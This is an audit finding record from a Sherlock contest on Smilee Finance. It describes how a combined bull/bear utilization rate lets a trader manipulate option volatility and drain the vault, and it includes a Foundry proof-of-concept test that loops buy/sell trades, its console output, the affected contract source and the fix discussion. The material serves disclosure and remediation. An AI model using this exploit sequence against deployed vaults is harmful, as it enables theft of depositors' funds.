{
  "Title": "H-2: Utilization rate for bonding curve purposes is calculated for a total of bull and bear usage, which can be abused to steal all vault funds",
  "Content": "# Issue H-2: Utilization rate for bonding curve purposes is calculated for a total of bull and bear usage, which can be abused to steal all vault funds \n\nSource: https://github.com/sherlock-audit/2024-02-smilee-finance-judging/issues/99 \n\n## Found by \npanprog\n## Summary\n\nThe bonding curve used in the Smilee volatility calculation has the following purpose (from the docs):\n> to have volatility that responds to trades: specifically if a user buys volatility goes up, if they sell it goes down so as to ensure responsiveness to market actions\n\nThe problem is that this volatility used to price IG options is calculated from the utilization rate of both bull and bear together, however bull and bear premiums can be significantly different (when the current price is away from the strike), which makes changes to bull and bear pricing assymetrical in relation to utilization rate. This makes it possible to buy higher-priced option (bull or bear), then manipulate the volatility up by buying 100% of the lower-priced option (bear or bull), then sell higher-priced option at inflated volatility (== inflated price), and then sell lower-prices option at reduced volatility.\n\nThe price increase of the higher-priced option is larger in absolute value than the price decrease of lower-priced option, meaning these actions together are profitable for the trader (basically stealing from the vault).\n\nRepeating such actions allows to steal all vault funds rather quickly (in about 1500 transactions)\n\n## Vulnerability Detail\n\nThis is the scenario of stealing funds from the vault:\n1. Example: strike = 1, price = 1.2, weekly expiration, Kb = 1.23, vault has total deposit of 2 (available liquidity bull = 1, bear = 1)\n2. Buy 0.5 IG Bull, premium paid = 0.05058 [increases utilization to 25%]\n3. Buy 1 IG Bear, premium paid = 0.0001 [increases utilization to 75% basically for free]\n4. Sell 0.5 IG Bull, premium received = 0.05139 [decreases utilization to 50%]\n5. Sell 1 IG Bear, premium received = 0.000003 [decreases utilization to 0%]\n\nAs can be seen from the example, total premium paid is 0.05059, total premium received is 0.05139, all in one transaction. That's about 0.07% of vault amount stolen per transaction. All vault can be stolen in about 1500 transactions.\n\nThe numbers can be different depending on current price, expiry, volatility and the other things, but can be optimized to select appropriate amounts and price difference from the strike to steal from the vault.\n\n## Impact\n\nAll vault funds can be stolen by malicious user in about 1500 transactions.\n\n## Proof Of Concept\n\nCopy to `attack.t.sol`:\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.15;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\nimport {UD60x18, ud, convert} from \"@prb/math/UD60x18.sol\";\n\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {IPositionManager} from \"@project/interfaces/IPositionManager.sol\";\nimport {Epoch} from \"@project/lib/EpochController.sol\";\nimport {AmountsMath} from \"@project/lib/AmountsMath.sol\";\nimport {EpochFrequency} from \"@project/lib/EpochFrequency.sol\";\nimport {OptionStrategy} from \"@project/lib/OptionStrategy.sol\";\nimport {AddressProvider} from \"@project/AddressProvider.sol\";\nimport {MarketOracle} from \"@project/MarketOracle.sol\";\nimport {FeeManager} from \"@project/FeeManager.sol\";\nimport {Vault} from \"@project/Vault.sol\";\nimport {TestnetToken} from \"@project/testnet/TestnetToken.sol\";\nimport {TestnetPriceOracle} from \"@project/testnet/TestnetPriceOracle.sol\";\nimport {DVPUtils} from \"./utils/DVPUtils.sol\";\nimport {TokenUtils} from \"./utils/TokenUtils.sol\";\nimport {Utils} from \"./utils/Utils.sol\";\nimport {VaultUtils} from \"./utils/VaultUtils.sol\";\nimport {MockedIG} from \"./mock/MockedIG.sol\";\nimport {MockedRegistry} from \"./mock/MockedRegistry.sol\";\nimport {MockedVault} from \"./mock/MockedVault.sol\";\nimport {TestnetSwapAdapter} from \"@project/testnet/TestnetSwapAdapter.sol\";\nimport {PositionManager} from \"@project/periphery/PositionManager.sol\";\n\n\ncontract IGTradeTest is Test {\n    using AmountsMath for uint256;\n\n    address admin = address(0x1);\n\n    // User of Vault\n    address alice = address(0x2);\n    address bob = address(0x3);\n\n    //User of DVP\n    address charlie = address(0x4);\n    address david = address(0x5);\n\n    AddressProvider ap;\n    TestnetToken baseToken;\n    TestnetToken sideToken;\n    FeeManager feeManager;\n\n    MockedRegistry registry;\n\n    MockedVault vault;\n    MockedIG ig;\n    TestnetPriceOracle priceOracle;\n    TestnetSwapAdapter exchange;\n    uint _strike;\n\n    function setUp() public {\n        vm.warp(EpochFrequency.REF_TS);\n        //ToDo: Replace with Factory\n        vm.startPrank(admin);\n        ap = new AddressProvider(0);\n        registry = new MockedRegistry();\n        ap.grantRole(ap.ROLE_ADMIN(), admin);\n        registry.grantRole(registry.ROLE_ADMIN(), admin);\n        ap.setRegistry(address(registry));\n\n        vm.stopPrank();\n\n        vault = MockedVault(VaultUtils.createVault(EpochFrequency.WEEKLY, ap, admin, vm));\n        priceOracle = TestnetPriceOracle(ap.priceOracle());\n\n        baseToken = TestnetToken(vault.baseToken());\n        sideToken = TestnetToken(vault.sideToken());\n\n        vm.startPrank(admin);\n       \n        ig = new MockedIG(address(vault), address(ap));\n        ig.grantRole(ig.ROLE_ADMIN(), admin);\n        ig.grantRole(ig.ROLE_EPOCH_ROLLER(), admin);\n        vault.grantRole(vault.ROLE_ADMIN(), admin);\n        vm.stopPrank();\n        ig.setOptionPrice(1e3);\n        ig.setPayoffPerc(0.1e18); // 10 % -> position paying 1.1\n        ig.useRealDeltaHedge();\n        ig.useRealPercentage();\n        ig.useRealPremium();\n\n        DVPUtils.disableOracleDelayForIG(ap, ig, admin, vm);\n\n        vm.prank(admin);\n        registry.registerDVP(address(ig));\n        vm.prank(admin);\n        MockedVault(vault).setAllowedDVP(address(ig));\n        feeManager = FeeManager(ap.feeManager());\n\n        exchange = TestnetSwapAdapter(ap.exchangeAdapter());\n    }\n\n    // try to buy/sell ig bull below strike for user's profit\n    // this will not be hedged, and thus the vault should lose funds\n    function test() public {\n        _strike = 1e18;\n        VaultUtils.addVaultDeposit(alice, 1e18, admin, address(vault), vm);\n        VaultUtils.addVaultDeposit(bob, 1e18, admin, address(vault), vm);\n\n        Utils.skipWeek(true, vm);\n\n        vm.prank(admin);\n        ig.rollEpoch();\n\n        VaultUtils.logState(vault);\n        DVPUtils.debugState(ig);\n\n        // increasing internal volatility cheaply\n        testBuyOption(1e18, 1e18, 0);\n        testSellOption(1.2e18, 1e18, 0);\n        for (uint i = 0; i < 100; i++) {\n            testBuyOption(1.2e18, 0.5e18, 0);\n            testBuyOption(1.2e18, 0, 1e18); // increase volatility to raise premium\n            testSellOption(1.2e18, 0.5e18, 0); // sell at increased premium\n            testSellOption(1.2e18, 0, 1e18); // sell at reduced premium, but the loss should be smaller in absolute value\n        }\n        testBuyOption(1.2e18, 1e18, 0);\n        testSellOption(1e18, 1e18, 0);\n\n        (uint256 btAmount, uint256 stAmount) = vault.balances();\n        console.log(\"base token notional\", btAmount);\n        console.log(\"side token notional\", stAmount);\n    }\n\n    function testBuyOption(uint price, uint128 optionAmountUp, uint128 optionAmountDown) internal {\n\n        vm.prank(admin);\n        priceOracle.setTokenPrice(address(sideToken), price);\n\n        (uint256 premium, uint256 fee) = _assurePremium(charlie, _strike, optionAmountUp, optionAmountDown);\n\n        vm.startPrank(charlie);\n        premium = ig.mint(charlie, _strike, optionAmountUp, optionAmountDown, premium, 10e18, 0);\n        vm.stopPrank();\n\n        console.log(\"premium\", premium);\n    }\n\n    function testSellOption(uint price, uint128 optionAmountUp, uint128 optionAmountDown) internal returns (uint) {\n        vm.prank(admin);\n        priceOracle.setTokenPrice(address(sideToken), price);\n\n        uint256 charliePayoff;\n        uint256 charliePayoffFee;\n        {\n            vm.startPrank(charlie);\n            (charliePayoff, charliePayoffFee) = ig.payoff(\n                ig.currentEpoch(),\n                _strike,\n                optionAmountUp,\n                optionAmountDown\n            );\n\n            charliePayoff = ig.burn(\n                ig.currentEpoch(),\n                charlie,\n                _strike,\n                optionAmountUp,\n                optionAmountDown,\n                charliePayoff,\n                0.1e18\n            );\n            vm.stopPrank();\n\n            console.log(\"payoff received\", charliePayoff);\n        }\n    }\n\n    function _assurePremium(\n        address user,\n        uint256 strike,\n        uint256 amountUp,\n        uint256 amountDown\n    ) private returns (uint256 premium_, uint256 fee) {\n        (premium_, fee) = ig.premium(strike, amountUp, amountDown);\n        TokenUtils.provideApprovedTokens(admin, address(baseToken), user, address(ig), premium_*5, vm);\n    }\n}\n```\n\nExecution console:\n```solidity\n  baseToken balance 1000000000000000000\n  sideToken balance 1000000000000000000\n...\n  premium 50583133160718864\n  premium 103825387572671\n  payoff received 51392715330063004\n  payoff received 2794032872479\n  premium 50583133160718864\n  premium 103825387572671\n  payoff received 51392715330063004\n  payoff received 2794032872479\n...\n  payoff received 51392715330063004\n  payoff received 2794032872479\n  premium 102785430660126009\n  payoff received 4990524176759610\n  base token notional 932297866651985054\n  side token notional 999999999999999956\n```\n\nNotice:\n1. Each 4 actions pay a total premium of 0.05059 and receive a total payoff of 0.05139 (0.0008 profit per 4 actions)\n2. After 100 such sequences of 4 actions, the vault loses 0.068 (6.8%)\n\n## Code Snippet\n\n`Notional.utilizationRateFactors` returns total (bear+bull) used and initial liquidity:\nhttps://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/lib/Notional.sol#L154-L160\n\n`IG.getUtilizationRate` uses these to calculate utilization rate:\nhttps://github.com/sherlock-audit/2024-02-smilee-finance/blob/main/smilee-v2-contracts/src/IG.sol#L116-L121\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nPossible mitigations include:\n1. Increase the spread between buying and selling premium\n2. Calculate utilization rate separately for bull and bear. However, this is not the best solution, because it might open up statistical attack vectors due to difference in bull/bear volatilities (has to be investigated more deeply)\n\n\n\n## Discussion\n\n**sherlock-admin4**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**takarez** commented:\n>  invalid; this seem to be an aknowledged issue ; read;https://docs.google.com/spreadsheets/d/1Ff7oeqtM8CjKmcV9OP8Q7HcFsGFgBPTYST8MfGfRzIs/edit#gid=984409625 Num. 19. and also thinking about the fees user need to pay for gas and protocol; it wouldnt be a win-win from the way i see it(i mean for such low profit)\n\n\n\n**sherlock-admin4**\n\nThe protocol team fixed this issue in PR/commit https://github.com/dverso/smilee-v2-contracts/commit/84174d20544970309c862a2bf35ccfa3046d6bd9.\n\n**panprog**\n\nFix review:\nA complex vega-weighted utilization rate solution was implemented, which solves the issue in the most correct way. In some edge cases the volatility might be incorrect (if trades are rare and vega for the used liquidity changes considerably), however in a way which can not be abused, just the user's price is bad for the user (too high if user buys, too low is user sells). So in these cases the impact is at most low. I consider it fixed.\n\n**sherlock-admin4**\n\nThe Lead Senior Watson signed off on the fix.\n\n",
  "Impact": "HIGH",
  "Source": "https://app.sherlock.xyz/audits/contests/180",
  "Code": [
    {
      "filename": "smilee-v2-contracts/src/lib/Notional.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.15;\n\nimport {ud} from \"@prb/math/UD60x18.sol\";\nimport {Amount, AmountHelper} from \"./Amount.sol\";\nimport {AmountsMath} from \"./AmountsMath.sol\";\n\n/**\n    @title Simple library to ease DVP liquidity access and modification\n */\nlibrary Notional {\n    using AmountHelper for Amount;\n\n    // NOTE: each one of the fields is a mapping strike -> [call_notional, put_notional]\n    struct Info {\n        // initial capital\n        mapping(uint256 => Amount) initial;\n        // liquidity used by options\n        mapping(uint256 => Amount) used;\n        // payoff set aside\n        mapping(uint256 => Amount) payoff;\n    }\n\n    /**\n        @notice Set the initial capital for the given strike and strategy.\n        @param strike the reference strike.\n        @param notional the initial capital.\n     */\n    function setInitial(Info storage self, uint256 strike, Amount calldata notional) external {\n        self.initial[strike] = notional;\n    }\n\n    /**\n        @notice Get the amount of liquidity used by options.\n        @param strike the reference strike.\n        @return amount The used liquidity.\n     */\n    function getInitial(Info storage self, uint256 strike) external view returns (Amount memory amount) {\n        amount = self.initial[strike];\n    }\n\n    /**\n        @notice Get the amount of liquidity available for new options.\n        @param strike the reference strike.\n        @return available_ The available liquidity.\n     */\n    function available(Info storage self, uint256 strike) external view returns (Amount memory available_) {\n        Amount memory initial = self.initial[strike];\n        Amount memory used = self.used[strike];\n\n        available_.up = initial.up - used.up;\n        available_.down = initial.down - used.down;\n    }\n\n    /**\n        @notice Record the increased usage of liquidity.\n        @param strike the reference strike.\n        @param amount the new used amount.\n        @dev Overflow checks must be done externally.\n     */\n    function increaseUsage(Info storage self, uint256 strike, Amount calldata amount) external {\n        self.used[strike].increase(amount);\n    }\n\n    /**\n        @notice Record the decreased usage of liquidity.\n        @param strike the reference strike.\n        @param amount the notional of the option.\n        @dev Underflow checks must be done externally.\n     */\n    function decreaseUsage(Info storage self, uint256 strike, Amount calldata amount) external {\n        self.used[strike].decrease(amount);\n    }\n\n    /**\n        @notice Get the amount of liquidity used by options.\n        @param strike the reference strike.\n        @return amount The used liquidity.\n     */\n    function getUsed(Info storage self, uint256 strike) external view returns (Amount memory amount) {\n        return self.used[strike];\n    }\n\n    /**\n        @notice Record the residual payoff set aside for the expired options not yet redeemed.\n        @param strike the reference strike.\n        @param payoffCall_ the payoff set aside for the call strategy.\n        @param payoffPut_ the payoff set aside for the put strategy.\n     */\n    function accountPayoffs(Info storage self, uint256 strike, uint256 payoffCall_, uint256 payoffPut_) external {\n        self.payoff[strike].setRaw(payoffCall_, payoffPut_);\n    }\n\n    /**\n        @notice Record the redeem of part of the residual payoff set aside for the expired options not yet redeemed\n        @param strike The reference strike\n        @param amount The redeemed payoff\n     */\n    function decreasePayoff(Info storage self, uint256 strike, Amount calldata amount) external {\n        self.payoff[strike].decrease(amount);\n    }\n\n    /**\n        @notice Get the residual payoff set aside for the expired options not yet redeemed\n        @param strike The reference strike\n        @return amount The payoff set aside\n     */\n    function getAccountedPayoff(Info storage self, uint256 strike) external view returns (Amount memory amount) {\n        amount = self.payoff[strike];\n    }\n\n    /**\n        @notice Get the share of residual payoff set aside for the given expired position\n        @param strike The position strike\n        @param amount_ The position notional\n        @param decimals The notional's token number of decimals\n        @return payoff_ The owed payoff\n        @dev It relies on the calls of decreaseUsage and decreasePayoff after each position is decreased\n     */\n    function shareOfPayoff(\n        Info storage self,\n        uint256 strike,\n        Amount memory amount_,\n        uint8 decimals\n    ) external view returns (Amount memory payoff_) {\n        Amount memory used_ = self.used[strike];\n        Amount memory accountedPayoff_ = self.payoff[strike];\n\n        if (amount_.up > 0) {\n            amount_.up = AmountsMath.wrapDecimals(amount_.up, decimals);\n            used_.up = AmountsMath.wrapDecimals(used_.up, decimals);\n            accountedPayoff_.up = AmountsMath.wrapDecimals(accountedPayoff_.up, decimals);\n\n            // amount : used = share : payoff\n            payoff_.up = (amount_.up*accountedPayoff_.up)/used_.up;\n            payoff_.up = AmountsMath.unwrapDecimals(payoff_.up, decimals);\n        }\n\n        if (amount_.down > 0) {\n            amount_.down = AmountsMath.wrapDecimals(amount_.down, decimals);\n            used_.down = AmountsMath.wrapDecimals(used_.down, decimals);\n            accountedPayoff_.down = AmountsMath.wrapDecimals(accountedPayoff_.down, decimals);\n\n            payoff_.down = (amount_.down*accountedPayoff_.down)/used_.down;\n            payoff_.down = AmountsMath.unwrapDecimals(payoff_.down, decimals);\n        }\n    }\n\n    /**\n        @notice Get the overall used and total liquidity for a given strike\n        @return used The overall used liquidity\n        @return total The overall liquidity\n     */\n    function utilizationRateFactors(\n        Info storage self,\n        uint256 strike\n    ) public view returns (uint256 used, uint256 total) {\n        used = self.used[strike].getTotal();\n        total = self.initial[strike].getTotal();\n    }\n\n    /**\n        @notice Get the utilization rate that will result after a given trade\n        @param amount The trade notional for CALL and PUT strategies\n        @param tradeIsBuy True for a buy trade, false for sell\n        @return utilizationRate The post-trade utilization rate\n     */\n    function postTradeUtilizationRate(\n        Info storage self,\n        uint256 strike,\n        Amount calldata amount,\n        bool tradeIsBuy,\n        uint8 tokenDecimals\n    ) external view returns (uint256 utilizationRate) {\n        (uint256 used, uint256 total) = utilizationRateFactors(self, strike);\n        if (total == 0) {\n            return 0;\n        }\n\n        uint256 tradeAmount = amount.getTotal();\n        tradeAmount = AmountsMath.wrapDecimals(tradeAmount, tokenDecimals);\n        used = AmountsMath.wrapDecimals(used, tokenDecimals);\n        total = AmountsMath.wrapDecimals(total, tokenDecimals);\n\n        if (tradeIsBuy) {\n            utilizationRate = ud(used).add(ud(tradeAmount)).div(ud(total)).unwrap();\n        } else {\n            utilizationRate = ud(used).sub(ud(tradeAmount)).div(ud(total)).unwrap();\n        }\n    }\n}"
    },
    {
      "filename": "smilee-v2-contracts/src/IG.sol",
      "content": "// SPDX-License-Identifier: BUSL-1.1\npragma solidity ^0.8.19;\n\nimport {IDVP} from \"./interfaces/IDVP.sol\";\nimport {IDVPAccessNFT} from \"./interfaces/IDVPAccessNFT.sol\";\nimport {IFeeManager} from \"./interfaces/IFeeManager.sol\";\nimport {IMarketOracle} from \"./interfaces/IMarketOracle.sol\";\nimport {IPriceOracle} from \"./interfaces/IPriceOracle.sol\";\nimport {IVault} from \"./interfaces/IVault.sol\";\nimport {Amount, AmountHelper} from \"./lib/Amount.sol\";\nimport {Epoch, EpochController} from \"./lib/EpochController.sol\";\nimport {Finance} from \"./lib/Finance.sol\";\nimport {FinanceParameters, FinanceIG, TimeLockedFinanceValues} from \"./lib/FinanceIG.sol\";\nimport {Notional} from \"./lib/Notional.sol\";\nimport {DVP} from \"./DVP.sol\";\nimport {EpochControls} from \"./EpochControls.sol\";\n\ncontract IG is DVP {\n    using AmountHelper for Amount;\n    using EpochController for Epoch;\n    using Notional for Notional.Info;\n\n    FinanceParameters public financeParameters;\n\n    /// @notice A flag to tell if this DVP is currently bound to check access for trade\n    bool public nftAccessFlag = false;\n\n    error NFTAccessDenied();\n\n    // Used by TheGraph for frontend needs:\n    event EpochStrike(uint256 epoch, uint256 strike);\n    event PausedForFinanceApproximation();\n    event ChangedFinanceParameters();\n\n    constructor(address vault_, address addressProvider_) DVP(vault_, false, addressProvider_) {\n        _setParameters(\n            TimeLockedFinanceValues({\n                sigmaMultiplier: 3e18,\n                tradeVolatilityUtilizationRateFactor: 2e18,\n                tradeVolatilityTimeDecay: 0.25e18,\n                volatilityPriceDiscountFactor: 0.9e18,\n                useOracleImpliedVolatility: true\n            })\n        );\n    }\n\n    /**\n        @notice Allows the contract's owner to enable or disable the nft access to trade operations\n     */\n    function setNftAccessFlag(bool flag) external {\n        _checkRole(ROLE_ADMIN);\n\n        nftAccessFlag = flag;\n    }\n\n    /// @notice Common strike price for all impermanent gain positions in this DVP, set at epoch start\n    function currentStrike() external view returns (uint256 strike_) {\n        strike_ = financeParameters.currentStrike;\n    }\n\n    /// @inheritdoc IDVP\n    function mint(\n        address recipient,\n        uint256 strike,\n        uint256 amountUp,\n        uint256 amountDown,\n        uint256 expectedPremium,\n        uint256 maxSlippage,\n        uint256 nftAccessTokenId\n    ) external override returns (uint256 premium_) {\n        strike;\n        _checkNFTAccess(nftAccessTokenId, recipient, amountUp + amountDown);\n        Amount memory amount_ = Amount({up: amountUp, down: amountDown});\n\n        premium_ = _mint(recipient, financeParameters.currentStrike, amount_, expectedPremium, maxSlippage);\n    }\n\n    /// @inheritdoc IDVP\n    function burn(\n        uint256 epoch,\n        address recipient,\n        uint256 strike,\n        uint256 amountUp,\n        uint256 amountDown,\n        uint256 expectedMarketValue,\n        uint256 maxSlippage\n    ) external override returns (uint256 paidPayoff) {\n        Amount memory amount_ = Amount({up: amountUp, down: amountDown});\n\n        paidPayoff = _burn(epoch, recipient, strike, amount_, expectedMarketValue, maxSlippage);\n    }\n\n    /// @inheritdoc IDVP\n    function premium(\n        uint256 strike,\n        uint256 amountUp,\n        uint256 amountDown\n    ) public view virtual override returns (uint256 premium_, uint256 fee) {\n        strike;\n\n        uint256 price = IPriceOracle(_getPriceOracle()).getPrice(sideToken, baseToken);\n        Amount memory amount_ = Amount({up: amountUp, down: amountDown});\n\n        premium_ = _getMarketValue(financeParameters.currentStrike, amount_, true, price);\n        (fee, ) = IFeeManager(_getFeeManager()).tradeBuyFee(\n            address(this),\n            getEpoch().current,\n            amountUp + amountDown,\n            premium_,\n            _baseTokenDecimals\n        );\n        premium_ += fee;\n    }\n\n    /// @inheritdoc IDVP\n    function getUtilizationRate() public view returns (uint256) {\n        Notional.Info storage liquidity = _liquidity[financeParameters.maturity];\n        (uint256 used, uint256 total) = liquidity.utilizationRateFactors(financeParameters.currentStrike);\n\n        return Finance.getUtilizationRate(used, total, _baseTokenDecimals);\n    }\n\n    /// @inheritdoc DVP\n    function _getMarketValue(\n        uint256 strike,\n        Amount memory amount,\n        bool tradeIsBuy,\n        uint256 swapPrice\n    ) internal view virtual override returns (uint256 marketValue) {\n        marketValue = FinanceIG.getMarketValue(\n            financeParameters,\n            amount,\n            getPostTradeVolatility(strike, amount, tradeIsBuy),\n            swapPrice,\n            IMarketOracle(_getMarketOracle()).getRiskFreeRate(baseToken),\n            _baseTokenDecimals\n        );\n    }\n\n    function notional()\n        external\n        view\n        returns (uint256 bearNotional, uint256 bullNotional, uint256 bearAvailNotional, uint256 bullAvailNotional)\n    {\n        Notional.Info storage liquidity = _liquidity[financeParameters.maturity];\n\n        Amount memory initial = liquidity.getInitial(financeParameters.currentStrike);\n        Amount memory available = liquidity.available(financeParameters.currentStrike);\n\n        return (initial.down, initial.up, available.down, available.up);\n    }\n\n    // NOTE: public for frontend usage\n    /**\n        @notice Get the estimated implied volatility from a given trade.\n        @param strike The trade strike.\n        @param amount The trade notional.\n        @param tradeIsBuy positive for buy, negative for sell.\n        @return sigma The estimated implied volatility.\n        @dev The oracle must provide an updated baseline volatility, computed just before the start of the epoch.\n        @dev it reverts if there's no previous epoch\n     */\n    function getPostTradeVolatility(\n        uint256 strike,\n        Amount memory amount,\n        bool tradeIsBuy\n    ) public view returns (uint256 sigma) {\n        strike;\n\n        Notional.Info storage liquidity = _liquidity[financeParameters.maturity];\n        uint256 ur = liquidity.postTradeUtilizationRate(\n            financeParameters.currentStrike,\n            amount,\n            tradeIsBuy,\n            _baseTokenDecimals\n        );\n        uint256 t0 = getEpoch().current - getEpoch().frequency;\n\n        return FinanceIG.getPostTradeVolatility(financeParameters, ur, t0);\n    }\n\n    /// @inheritdoc DVP\n    function _deltaHedgePosition(\n        uint256 strike,\n        Amount memory amount,\n        bool tradeIsBuy\n    ) internal virtual override returns (uint256 swapPrice) {\n        uint256 oraclePrice = IPriceOracle(_getPriceOracle()).getPrice(sideToken, baseToken);\n\n        Notional.Info storage liquidity = _liquidity[financeParameters.maturity];\n\n        // Also update the epoch volatility with the trade effect:\n        uint256 ur = liquidity.postTradeUtilizationRate(\n            financeParameters.currentStrike,\n            amount,\n            tradeIsBuy,\n            _baseTokenDecimals\n        );\n        FinanceIG.updateVolatilityOnTrade(financeParameters, oraclePrice, ur);\n\n        Amount memory availableLiquidity = liquidity.available(strike);\n        (, uint256 sideTokensAmount) = IVault(vault).balances();\n\n        int256 tokensToSwap;\n        tokensToSwap = FinanceIG.getDeltaHedgeAmount(\n            financeParameters,\n            amount,\n            tradeIsBuy,\n            oraclePrice,\n            sideTokensAmount,\n            availableLiquidity,\n            _baseTokenDecimals,\n            _sideTokenDecimals\n        );\n\n        if (tokensToSwap == 0) {\n            return oraclePrice;\n        }\n\n        // NOTE: We negate the value because the protocol will sell side tokens when `h` is positive.\n        uint256 exchangedBaseTokens = IVault(vault).deltaHedge(-tokensToSwap);\n\n        swapPrice = Finance.getSwapPrice(tokensToSwap, exchangedBaseTokens, _sideTokenDecimals, _baseTokenDecimals);\n    }\n\n    /// @inheritdoc DVP\n    function _residualPayoffPerc(\n        uint256 strike,\n        uint256 price\n    ) internal view virtual override returns (uint256, uint256) {\n        strike;\n        return FinanceIG.getPayoffPercentages(financeParameters, price);\n    }\n\n    /// @inheritdoc DVP\n    function _residualPayoff() internal view virtual override returns (uint256 residualPayoff) {\n        Notional.Info storage liquidity = _liquidity[financeParameters.maturity];\n\n        residualPayoff = liquidity.getAccountedPayoff(financeParameters.currentStrike).getTotal();\n    }\n\n    /// @inheritdoc DVP\n    function _accountResidualPayoffs(uint256 price) internal virtual override {\n        _accountResidualPayoff(financeParameters.currentStrike, price);\n    }\n\n    /// @inheritdoc EpochControls\n    function _afterRollEpoch() internal virtual override {\n        Epoch memory epoch = getEpoch();\n\n        financeParameters.maturity = epoch.current;\n        financeParameters.currentStrike = IPriceOracle(_getPriceOracle()).getPrice(sideToken, baseToken);\n        financeParameters.internalVolatilityParameters.epochStart = epoch.current - epoch.frequency; // Not using epoch.previous because epoch may be skipped\n\n        emit EpochStrike(epoch.current, financeParameters.currentStrike);\n\n        {\n            uint256 iv = IMarketOracle(_getMarketOracle()).getImpliedVolatility(\n                baseToken,\n                sideToken,\n                financeParameters.currentStrike,\n                epoch.frequency\n            );\n            FinanceIG.updateParameters(financeParameters, iv);\n        }\n\n        super._afterRollEpoch();\n\n        if (FinanceIG.checkFinanceApprox(financeParameters)) {\n            _pause();\n            emit PausedForFinanceApproximation();\n        }\n\n        // NOTE: initial liquidity is allocated by the DVP call\n        Notional.Info storage liquidity = _liquidity[financeParameters.maturity];\n        financeParameters.initialLiquidity = liquidity.getInitial(financeParameters.currentStrike);\n    }\n\n    /// @inheritdoc DVP\n    function _allocateLiquidity(uint256 initialCapital) internal virtual override {\n        // The initialCapital is split 50:50 on the two strategies:\n        uint256 halfInitialCapital = initialCapital / 2;\n        Amount memory allocation = Amount({up: halfInitialCapital, down: initialCapital - halfInitialCapital});\n\n        Notional.Info storage liquidity = _liquidity[financeParameters.maturity];\n\n        // The impermanent gain (IG) DVP only has one strike:\n        liquidity.setInitial(financeParameters.currentStrike, allocation);\n    }\n\n    /// @dev parameters must be defined in Wad\n    /// @dev aggregated in order to limit contract size\n    function setParameters(TimeLockedFinanceValues calldata params) external {\n        _checkRole(ROLE_ADMIN);\n        _setParameters(params);\n\n        emit ChangedFinanceParameters();\n    }\n\n    /// @dev parameters must be defined in Wad\n    /// @dev aggregated in order to limit contract size\n    function _setParameters(TimeLockedFinanceValues memory params) internal {\n        uint256 timeToValidity = getEpoch().timeToNextEpoch();\n        FinanceIG.updateTimeLockedParameters(financeParameters.timeLocked, params, timeToValidity);\n    }\n\n    /// @dev Checks if given trade is allowed to be made using nft.checkCap callback func\n    function _checkNFTAccess(uint256 accessTokenId, address receiver, uint256 notionalAmount) internal {\n        if (nftAccessFlag) {\n            IDVPAccessNFT nft = IDVPAccessNFT(_addressProvider.dvpAccessNFT());\n            if (accessTokenId == 0 || nft.ownerOf(accessTokenId) != receiver) {\n                revert NFTAccessDenied();\n            }\n            nft.checkCap(accessTokenId, notionalAmount);\n        }\n    }\n}"
    }
  ]
}